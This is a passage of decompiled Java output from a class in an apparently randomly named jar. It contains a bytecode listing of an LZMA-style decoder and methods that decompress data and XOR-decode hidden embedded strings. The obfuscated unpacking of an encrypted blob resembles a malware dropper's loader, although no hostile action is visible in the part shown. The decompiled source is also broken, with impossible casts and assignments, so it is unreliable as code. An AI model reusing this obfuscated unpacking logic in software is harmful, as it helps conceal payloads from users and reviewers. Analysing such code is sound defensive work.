    //   183: iload #9
    //   185: iconst_4
    //   186: if_icmplt -> 166
    //   189: aload #12
    //   191: getfield i : [S
    //   194: invokestatic c : (Ljava/lang/Object;)V
    //   197: iconst_0
    //   198: istore #13
    //   200: goto -> 234
    //   203: aload #12
    //   205: getfield c : [[S
    //   208: iload #13
    //   210: aaload
    //   211: checkcast [S
    //   214: invokestatic c : (Ljava/lang/Object;)V
    //   217: aload #12
    //   219: getfield d : [[S
    //   222: iload #13
    //   224: aaload
    //   225: checkcast [S
    //   228: invokestatic c : (Ljava/lang/Object;)V
    //   231: iinc #13, 1
    //   234: iload #13
    //   236: aload #12
    //   238: getfield m : I
    //   241: if_icmplt -> 203
    //   244: aload #12
    //   246: getfield j : [S
    //   249: checkcast [S
    //   252: invokestatic c : (Ljava/lang/Object;)V
    //   255: aload #12
    //   257: getfield k : [S
    //   260: invokestatic c : (Ljava/lang/Object;)V
    //   263: iconst_0
    //   264: istore #13
    //   266: goto -> 300
    //   269: aload #12
    //   271: getfield e : [[S
    //   274: iload #13
    //   276: aaload
    //   277: checkcast [S
    //   280: invokestatic c : (Ljava/lang/Object;)V
    //   283: aload #12
    //   285: getfield f : [[S
    //   288: iload #13
    //   290: aaload
    //   291: checkcast [S
    //   294: invokestatic c : (Ljava/lang/Object;)V
    //   297: iinc #13, 1
    //   300: iload #13
    //   302: aload #12
    //   304: getfield n : I
    //   307: if_icmplt -> 269
    //   310: aload #12
    //   312: getfield l : [S
    //   315: checkcast [S
    //   318: invokestatic c : (Ljava/lang/Object;)V
    //   321: aload #12
    //   323: getfield h : [S
    //   326: checkcast [S
    //   329: invokestatic c : (Ljava/lang/Object;)V
    //   332: aload #12
    //   334: dup
    //   335: astore #9
    //   337: iconst_0
    //   338: putfield h : I
    //   341: aload #9
    //   343: iconst_m1
    //   344: putfield g : I
    //   347: iconst_0
    //   348: istore_2
    //   349: goto -> 373
    //   352: aload #9
    //   354: dup
    //   355: getfield h : I
    //   358: bipush #8
    //   360: ishl
    //   361: aload #9
    //   363: invokevirtual a : ()I
    //   366: ior
    //   367: putfield h : I
    //   370: iinc #2, 1
    //   373: iload_2
    //   374: iconst_5
    //   375: if_icmplt -> 352
    //   378: iconst_0
    //   379: istore_1
    //   380: iconst_0
    //   381: istore_2
    //   382: iconst_0
    //   383: istore #5
    //   385: iconst_0
    //   386: istore #6
    //   388: iconst_0
    //   389: istore #7
    //   391: lconst_0
    //   392: lstore #10
    //   394: iconst_0
    //   395: istore #8
    //   397: goto -> 1514
    //   400: lload #10
    //   402: l2i
    //   403: aload_0
    //   404: getfield q : I
    //   407: iand
    //   408: istore #9
    //   410: aload_0
    //   411: dup
    //   412: getfield a : [S
    //   415: iload_1
    //   416: iconst_4
    //   417: ishl
    //   418: iload #9
    //   420: iadd
    //   421: invokevirtual a : (Ljava/lang/Object;I)I
    //   424: ifne -> 696
    //   427: aload_0
    //   428: getfield a : [[S
    //   431: lload #10
    //   433: l2i
    //   434: aload_0
    //   435: getfield l : I
    //   438: iand
    //   439: aload_0
    //   440: getfield j : I
    //   443: ishl
    //   444: iload #8
    //   446: sipush #255
    //   449: iand
    //   450: bipush #8
    //   452: aload_0
    //   453: getfield j : I
    //   456: isub
    //   457: iushr
    //   458: iadd
    //   459: aaload
    //   460: astore #8
    //   462: iload_1
    //   463: bipush #7
    //   465: if_icmpge -> 472
    //   468: iconst_1
    //   469: goto -> 473
    //   472: iconst_0
    //   473: ifne -> 581
    //   476: aload_0
    //   477: iload_2
    //   478: invokevirtual a : (I)B
    //   481: istore #12
    //   483: iconst_1
    //   484: istore #9
    //   486: iload #12
    //   488: bipush #7
    //   490: ishr
    //   491: iconst_1
    //   492: iand
    //   493: istore #13
    //   495: iload #12
    //   497: iconst_1
    //   498: ishl
    //   499: i2b
    //   500: istore #12
    //   502: aload_0
    //   503: aload #8
    //   505: iload #13
    //   507: iconst_1
    //   508: iadd
    //   509: bipush #8
    //   511: ishl
    //   512: iload #9
    //   514: iadd
    //   515: invokevirtual a : (Ljava/lang/Object;I)I
    //   518: istore #14
    //   520: iload #9
    //   522: iconst_1
    //   523: ishl
    //   524: iload #14
    //   526: ior
    //   527: istore #9
    //   529: iload #13
    //   531: iload #14
    //   533: if_icmpeq -> 565
    //   536: goto -> 554
    //   539: iload #9
    //   541: iconst_1
    //   542: ishl
    //   543: aload_0
    //   544: aload #8
    //   546: iload #9
    //   548: invokevirtual a : (Ljava/lang/Object;I)I
    //   551: ior
    //   552: istore #9
    //   554: iload #9
    //   556: sipush #256
    //   559: if_icmplt -> 539
    //   562: goto -> 573
    //   565: iload #9
    //   567: sipush #256
    //   570: if_icmplt -> 486
    //   573: iload #9
    //   575: i2b
    //   576: istore #8
    //   578: goto -> 611
    //   581: iconst_1
    //   582: istore #12
    //   584: iload #12
    //   586: iconst_1
    //   587: ishl
    //   588: aload_0
    //   589: aload #8
    //   591: iload #12
    //   593: invokevirtual a : (Ljava/lang/Object;I)I
    //   596: ior
    //   597: dup
    //   598: istore #12
    //   600: sipush #256
    //   603: if_icmplt -> 584
    //   606: iload #12
    //   608: i2b
    //   609: istore #8
    //   611: aload_0
    //   612: iload #8
    //   614: istore #9
    //   616: dup
    //   617: astore #12
    //   619: getfield a : [B
    //   622: aload #12
    //   624: dup
    //   625: getfield c : I
    //   628: dup_x1
    //   629: iconst_1
    //   630: iadd
    //   631: putfield c : I
    //   634: iload #9
    //   636: bastore
    //   637: aload #12
    //   639: getfield c : I
    //   642: aload #12
    //   644: getfield d : I
    //   647: if_icmplt -> 655
    //   650: aload #12
    //   652: invokevirtual b : ()V
    //   655: iload_1
    //   656: dup
    //   657: istore #12
    //   659: iconst_4
    //   660: if_icmpge -> 667
    //   663: iconst_0
    //   664: goto -> 686
    //   667: iload #12
    //   669: bipush #10
    //   671: if_icmpge -> 681
    //   674: iload #12
    //   676: iconst_3
    //   677: isub
    //   678: goto -> 686
    //   681: iload #12
    //   683: bipush #6
    //   685: isub
    //   686: istore_1
    //   687: lload #10
    //   689: lconst_1
    //   690: ladd
    //   691: lstore #10
    //   693: goto -> 1514
    //   696: aload_0
    //   697: dup
    //   698: getfield b : [S
    //   701: iload_1
    //   702: invokevirtual a : (Ljava/lang/Object;I)I
    //   705: iconst_1
    //   706: if_icmpne -> 921
    //   709: iconst_0
    //   710: istore #8
    //   712: aload_0
    //   713: dup
    //   714: getfield c : [S
    //   717: iload_1
    //   718: invokevirtual a : (Ljava/lang/Object;I)I
    //   721: ifne -> 761
    //   724: aload_0
    //   725: dup
    //   726: getfield f : [S
    //   729: iload_1
    //   730: iconst_4
    //   731: ishl
    //   732: iload #9
    //   734: iadd
    //   735: invokevirtual a : (Ljava/lang/Object;I)I
    //   738: ifne -> 817
    //   741: iload_1
    //   742: bipush #7
    //   744: if_icmpge -> 752
    //   747: bipush #9
    //   749: goto -> 754
    //   752: bipush #11
    //   754: istore_1
    //   755: iconst_1
    //   756: istore #8
    //   758: goto -> 817
    //   761: aload_0
    //   762: dup
    //   763: getfield d : [S
    //   766: iload_1
    //   767: invokevirtual a : (Ljava/lang/Object;I)I
    //   770: ifne -> 780
    //   773: iload #5
    //   775: istore #12
    //   777: goto -> 811
    //   780: aload_0
    //   781: dup
    //   782: getfield e : [S
    //   785: iload_1
    //   786: invokevirtual a : (Ljava/lang/Object;I)I
    //   789: ifne -> 799
    //   792: iload #6
    //   794: istore #12
    //   796: goto -> 807
    //   799: iload #7
    //   801: istore #12
    //   803: iload #6
    //   805: istore #7
    //   807: iload #5
    //   809: istore #6
    //   811: iload_2
    //   812: istore #5
    //   814: iload #12
    //   816: istore_2
    //   817: iload #8
    //   819: ifne -> 1375
    //   822: aload_0
    //   823: dup
    //   824: getfield k : [S
    //   827: iconst_0
    //   828: invokevirtual a : (Ljava/lang/Object;I)I
    //   831: ifne -> 850
    //   834: aload_0
    //   835: dup
    //   836: getfield e : [[S
    //   839: iload #9
    //   841: aaload
    //   842: invokevirtual b : (Ljava/lang/Object;)I
    //   845: istore #12
    //   847: goto -> 897
    //   850: aload_0
    //   851: dup
    //   852: getfield k : [S
    //   855: iconst_1
    //   856: invokevirtual a : (Ljava/lang/Object;I)I
    //   859: ifne -> 881
    //   862: bipush #8
    //   864: aload_0
    //   865: dup
    //   866: getfield f : [[S
    //   869: iload #9
    //   871: aaload
    //   872: invokevirtual b : (Ljava/lang/Object;)I
    //   875: iadd
    //   876: istore #12
    //   878: goto -> 897
    //   881: bipush #8
    //   883: bipush #8
    //   885: aload_0
    //   886: dup
    //   887: getfield l : [S
    //   890: invokevirtual b : (Ljava/lang/Object;)I
    //   893: iadd
    //   894: iadd
    //   895: istore #12
    //   897: iload #12
    //   899: istore #8
    //   901: iinc #8, 2
    //   904: iload_1
    //   905: bipush #7
    //   907: if_icmpge -> 915
    //   910: bipush #8
    //   912: goto -> 917
    //   915: bipush #11
    //   917: istore_1
    //   918: goto -> 1375
    //   921: iload #6
    //   923: istore #7
    //   925: iload #5
    //   927: istore #6
    //   929: iload_2
    //   930: istore #5
    //   932: aload_0
    //   933: dup
    //   934: getfield i : [S
    //   937: iconst_0
    //   938: invokevirtual a : (Ljava/lang/Object;I)I
    //   941: ifne -> 960
    //   944: aload_0
    //   945: dup
    //   946: getfield c : [[S
    //   949: iload #9
    //   951: aaload
    //   952: invokevirtual b : (Ljava/lang/Object;)I
    //   955: istore #12
    //   957: goto -> 1007
    //   960: aload_0
    //   961: dup
    //   962: getfield i : [S
    //   965: iconst_1
    //   966: invokevirtual a : (Ljava/lang/Object;I)I
    //   969: ifne -> 991
    //   972: bipush #8
    //   974: aload_0
    //   975: dup
    //   976: getfield d : [[S
    //   979: iload #9
    //   981: aaload
    //   982: invokevirtual b : (Ljava/lang/Object;)I
    //   985: iadd
    //   986: istore #12
    //   988: goto -> 1007
    //   991: bipush #8
    //   993: bipush #8
    //   995: aload_0
    //   996: dup
    //   997: getfield j : [S
    //   1000: invokevirtual b : (Ljava/lang/Object;)I
    //   1003: iadd
    //   1004: iadd
    //   1005: istore #12
    //   1007: iload #12
    //   1009: istore #8
    //   1011: iinc #8, 2
    //   1014: iload_1
    //   1015: bipush #7
    //   1017: if_icmpge -> 1025
    //   1020: bipush #7
    //   1022: goto -> 1027
    //   1025: bipush #10
    //   1027: istore_1
    //   1028: aload_0
    //   1029: dup
    //   1030: getfield b : [[S
    //   1033: iload #8
    //   1035: istore #12
    //   1037: iinc #12, -2
    //   1040: iload #12
    //   1042: iconst_4
    //   1043: if_icmpge -> 1051
    //   1046: iload #12
    //   1048: goto -> 1052
    //   1051: iconst_3
    //   1052: aaload
    //   1053: invokevirtual b : (Ljava/lang/Object;)I
    //   1056: dup
    //   1057: istore #9
    //   1059: iconst_4
    //   1060: if_icmplt -> 1372
    //   1063: iload #9
    //   1065: iconst_1
    //   1066: ishr
    //   1067: iconst_1
    //   1068: isub
    //   1069: istore #13
    //   1071: iconst_2
    //   1072: iload #9
    //   1074: iconst_1
    //   1075: iand
    //   1076: ior
    //   1077: iload #13
    //   1079: ishl
    //   1080: istore_2
    //   1081: iload #9
    //   1083: bipush #14
    //   1085: if_icmpge -> 1156
    //   1088: iconst_1
    //   1089: istore #14
    //   1091: iconst_0
    //   1092: istore #12
    //   1094: iconst_0
    //   1095: istore #15
    //   1097: goto -> 1141
    //   1100: aload_0
    //   1101: dup
    //   1102: getfield g : [S
    //   1105: iload_2
    //   1106: iload #9
    //   1108: isub
    //   1109: iconst_1
    //   1110: isub
    //   1111: iload #14
    //   1113: iadd
    //   1114: invokevirtual a : (Ljava/lang/Object;I)I
    //   1117: istore #16
    //   1119: iload #14
    //   1121: iconst_1
    //   1122: ishl
    //   1123: iload #16
    //   1125: iadd
    //   1126: istore #14
    //   1128: iload #12
    //   1130: iload #16
    //   1132: iload #15
    //   1134: ishl
    //   1135: ior
    //   1136: istore #12
    //   1138: iinc #15, 1
    //   1141: iload #15
    //   1143: iload #13
    //   1145: if_icmplt -> 1100
    //   1148: iload_2
    //   1149: iload #12
    //   1151: iadd
    //   1152: istore_2
    //   1153: goto -> 1375
    //   1156: iload_2
    //   1157: aload_0
    //   1158: iload #13
    //   1160: iconst_4
    //   1161: isub
    //   1162: istore #9
    //   1164: astore #12
    //   1166: iconst_0
    //   1167: istore #13
    //   1169: goto -> 1272
    //   1172: aload #12
    //   1174: dup
    //   1175: getfield g : I
    //   1178: iconst_1
    //   1179: iushr
    //   1180: putfield g : I
    //   1183: aload #12
    //   1185: getfield h : I
    //   1188: aload #12
    //   1190: getfield g : I
    //   1193: isub
    //   1194: bipush #31
    //   1196: iushr
    //   1197: istore_2
    //   1198: aload #12
    //   1200: dup
    //   1201: getfield h : I
    //   1204: aload #12
    //   1206: getfield g : I
    //   1209: iload_2
    //   1210: iconst_1
    //   1211: isub
    //   1212: iand
    //   1213: isub
    //   1214: putfield h : I
    //   1217: iload #13
    //   1219: iconst_1
    //   1220: ishl
    //   1221: iconst_1
    //   1222: iload_2
    //   1223: isub
    //   1224: ior
    //   1225: istore #13
    //   1227: aload #12
    //   1229: getfield g : I
    //   1232: ldc_w -16777216
    //   1235: iand
    //   1236: ifne -> 1269
    //   1239: aload #12
    //   1241: dup
    //   1242: getfield h : I
    //   1245: bipush #8
    //   1247: ishl
    //   1248: aload #12
    //   1250: invokevirtual a : ()I
    //   1253: ior
    //   1254: putfield h : I
    //   1257: aload #12
    //   1259: dup
    //   1260: getfield g : I
    //   1263: bipush #8
    //   1265: ishl
    //   1266: putfield g : I
    //   1269: iinc #9, -1
    //   1272: iload #9
    //   1274: ifne -> 1172
    //   1277: iload #13
    //   1279: iconst_4
    //   1280: ishl
    //   1281: iadd
    //   1282: aload_0
    //   1283: dup
    //   1284: getfield h : [S
    //   1287: astore #9
    //   1289: astore #12
    //   1291: aload #9
    //   1293: checkcast [S
    //   1296: astore #13
    //   1298: bipush #31
    //   1300: aload #13
    //   1302: arraylength
    //   1303: invokestatic a : (I)I
    //   1306: isub
    //   1307: istore #9
    //   1309: iconst_1
    //   1310: istore_2
    //   1311: iconst_0
    //   1312: istore #14
    //   1314: iconst_0
    //   1315: istore #15
    //   1317: goto -> 1350
    //   1320: aload #12
    //   1322: aload #13
    //   1324: iload_2
    //   1325: invokevirtual a : (Ljava/lang/Object;I)I
    //   1328: istore #16
    //   1330: iload_2
    //   1331: iconst_1
    //   1332: ishl
    //   1333: iload #16
    //   1335: iadd
    //   1336: istore_2
    //   1337: iload #14
    //   1339: iload #16
    //   1341: iload #15
    //   1343: ishl
    //   1344: ior
    //   1345: istore #14
    //   1347: iinc #15, 1
    //   1350: iload #15
    //   1352: iload #9
    //   1354: if_icmplt -> 1320
    //   1357: iload #14
    //   1359: iadd
    //   1360: dup
    //   1361: istore_2
    //   1362: ifge -> 1375
    //   1365: iload_2
    //   1366: iconst_m1
    //   1367: if_icmpeq -> 1527
    //   1370: iconst_0
    //   1371: ireturn
    //   1372: iload #9
    //   1374: istore_2
    //   1375: iload_2
    //   1376: i2l
    //   1377: lload #10
    //   1379: lcmp
    //   1380: ifge -> 1391
    //   1383: iload_2
    //   1384: aload_0
    //   1385: getfield p : I
    //   1388: if_icmplt -> 1393
    //   1391: iconst_0
    //   1392: ireturn
    //   1393: aload_0
    //   1394: iload_2
    //   1395: iload #8
    //   1397: istore #13
    //   1399: istore #9
    //   1401: dup
    //   1402: astore #12
    //   1404: getfield c : I
    //   1407: iload #9
    //   1409: isub
    //   1410: iconst_1
    //   1411: isub
    //   1412: dup
    //   1413: istore #9
    //   1415: ifge -> 1494
    //   1418: iload #9
    //   1420: aload #12
    //   1422: getfield d : I
    //   1425: iadd
    //   1426: istore #9
    //   1428: goto -> 1494
    //   1431: iload #9
    //   1433: aload #12
    //   1435: getfield d : I
    //   1438: if_icmplt -> 1444
    //   1441: iconst_0
    //   1442: istore #9
    //   1444: aload #12
    //   1446: getfield a : [B
    //   1449: aload #12
    //   1451: dup
    //   1452: getfield c : I
    //   1455: dup_x1
    //   1456: iconst_1
    //   1457: iadd
    //   1458: putfield c : I
    //   1461: aload #12
    //   1463: getfield a : [B
    //   1466: iload #9
    //   1468: iinc #9, 1
    //   1471: baload
    //   1472: bastore
    //   1473: aload #12
    //   1475: getfield c : I
    //   1478: aload #12
    //   1480: getfield d : I
    //   1483: if_icmplt -> 1491
    //   1486: aload #12
    //   1488: invokevirtual b : ()V
    //   1491: iinc #13, -1
    //   1494: iload #13
    //   1496: ifne -> 1431
    //   1499: lload #10
    //   1501: iload #8
    //   1503: i2l
    //   1504: ladd
    //   1505: lstore #10
    //   1507: aload_0
    //   1508: iconst_0
    //   1509: invokevirtual a : (I)B
    //   1512: istore #8
    //   1514: lload_3
    //   1515: lconst_0
    //   1516: lcmp
    //   1517: iflt -> 400
    //   1520: lload #10
    //   1522: lload_3
    //   1523: lcmp
    //   1524: iflt -> 400
    //   1527: aload_0
    //   1528: invokevirtual b : ()V
    //   1531: aload_0
    //   1532: invokevirtual a : ()V
    //   1535: aload_0
    //   1536: aconst_null
    //   1537: putfield c : [B
    //   1540: iconst_1
    //   1541: ireturn
  }
  
  private static void d(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++)
      paramObject[b] = false; 
  }
  
  private static void e(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++) {
      if (paramObject[b] != null)
        d(paramObject[b]); 
    } 
  }
  
  private void c() {
    byte[] arrayOfByte = (byte[])this.a;
    for (byte b = 0; b < arrayOfByte.length; b++)
      arrayOfByte[b] = 0; 
    this.c = false;
    this.d = false;
    this.e = false;
    this.b = null;
    this.g = false;
    this.h = false;
    this.c = null;
    this.j = false;
    this.k = false;
    this.l = false;
    e(this.a);
    d(this.a);
    d(this.b);
    d(this.b);
    d(this.c);
    d(this.d);
    d(this.e);
    d(this.f);
    e(this.b);
    d(this.g);
    d(this.h);
    d(this.i);
    e(this.c);
    e(this.d);
    d(this.j);
    this.m = 0;
    d(this.k);
    e(this.e);
    e(this.f);
    d(this.l);
    this.n = 0;
    this.o = 0;
    this.p = 0;
    this.q = 0;
  }
  
  public static byte[] b(byte[] paramArrayOfbyte) {
    l l1 = null;
    try {
      byte[] arrayOfByte2 = a(paramArrayOfbyte, 5);
      byte[] arrayOfByte3 = arrayOfByte2;
      l l2 = l1 = new l();
      int j;
      int k = (j = arrayOfByte3[0] & 0xFF) % 9;
      int m = (j /= 9) % 5;
      j /= 5;
      int n = 0;
      int i1;
      for (i1 = 0; i1 < 4; i1++)
        n += (arrayOfByte3[i1 + 1] & 0xFF) << i1 << 3; 
      m = j;
      k = m;
      j = k;
      l l4 = l2;
      i1 = j;
      k = k;
      l l5;
      if ((l5 = l4).a == null || l5.j != i1 || l5.k != k) {
        l5.k = k;
        l5.l = (1 << k) - 1;
        l5.j = i1;
        k = 1 << l5.j + l5.k;
        l5.a = (short[])new short[k][];
        for (i1 = 0; i1 < k; i1++)
          l5.a[i1] = new short[768]; 
      } 
      int i = 1 << m;
      for (k = l4.m; k < i; k++) {
        l4.c[k] = new short[8];
        l4.d[k] = new short[8];
      } 
      l4.m = k;
      for (k = l4.n; k < i; k++) {
        l4.e[k] = new short[8];
        l4.f[k] = new short[8];
      } 
      l4.n = k;
      l4.q = i - 1;
      i = n;
      l4 = l2;
      if (l4.o != i) {
        l4.o = i;
        l4.p = Math.max(l4.o, 1);
        m = Math.max(l4.p, 4096);
        l l6;
        if ((l6 = l4).a == null || l6.d != m)
          l6.a = (short[])new byte[m]; 
        l6.d = m;
        l6.c = false;
        l6.e = false;
      } 
      if (!((arrayOfByte3.length < 5) ? 0 : (!((j > 8 || k > 4 || m > 4) ? 0 : 1) ? 0 : ((i < 0) ? 0 : 1))))
        throw new IllegalArgumentException(); 
      long l3 = 0L;
      for (byte b = 0; b < 8; b++) {
        k = paramArrayOfbyte[b + 5] & 0xFF;
        l3 |= k << b << 3;
      } 
      byte[] arrayOfByte1 = new byte[(int)l3];
      if (!l1.a(paramArrayOfbyte, arrayOfByte1))
        return null; 
      paramArrayOfbyte = arrayOfByte1;
      return paramArrayOfbyte;
    } finally {
      if (l1 != null)
        l1.c(); 
    } 
  }
  
  private static byte[] a(long paramLong) {
    byte[] arrayOfByte;
    (arrayOfByte = new byte[8])[0] = (byte)(int)(paramLong >>> 56L);
    arrayOfByte[1] = (byte)(int)(paramLong >>> 48L);
    arrayOfByte[2] = (byte)(int)(paramLong >>> 40L);
    arrayOfByte[3] = (byte)(int)(paramLong >>> 32L);
    arrayOfByte[4] = (byte)(int)(paramLong >>> 24L);
    arrayOfByte[5] = (byte)(int)(paramLong >>> 16L);
    arrayOfByte[6] = (byte)(int)(paramLong >>> 8L);
    arrayOfByte[7] = (byte)(int)paramLong;
    return arrayOfByte;
  }
  
  private static byte[] a(byte[] paramArrayOfbyte, int paramInt1, int paramInt2) {
    byte[] arrayOfByte = new byte[paramInt2 -= paramInt1];
    System.arraycopy(paramArrayOfbyte, paramInt1, arrayOfByte, 0, Math.min(paramArrayOfbyte.length - paramInt1, paramInt2));
    return arrayOfByte;
  }
  
  public static byte[] a(byte[] paramArrayOfbyte, int paramInt) {
    byte[] arrayOfByte = new byte[paramInt];
    System.arraycopy(paramArrayOfbyte, 0, arrayOfByte, 0, Math.min(paramArrayOfbyte.length, paramInt));
    return arrayOfByte;
  }
  
  public static byte[] a() {
    byte[] arrayOfByte1 = a((String)b);
    byte[] arrayOfByte2 = a(b);
    for (byte b = 0; b < arrayOfByte1.length; b++)
      arrayOfByte1[b] = (byte)(arrayOfByte1[b] ^ arrayOfByte2[b % 8]); 
    return arrayOfByte1;
  }
  
  public static byte[] b() {
    byte[] arrayOfByte1 = a((String)a);
    byte[] arrayOfByte2 = a(a);
    for (byte b = 0; b < arrayOfByte1.length; b++)
      arrayOfByte1[b] = (byte)(arrayOfByte1[b] ^ arrayOfByte2[b % 8]); 
    return arrayOfByte1;
  }
  
  static {
    String str2;
    StringBuilder stringBuilder2;
    (stringBuilder2 = new StringBuilder()).append('U');
    stringBuilder2.append('T');
    stringBuilder2.append('F');
    stringBuilder2.append('-');
    stringBuilder2.append('8');
    c = (short[][])stringBuilder2.toString();
  }
}


/* Location:              C:\Users\localhost\Downloads\oea2swrf.jar!\net\java\l.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */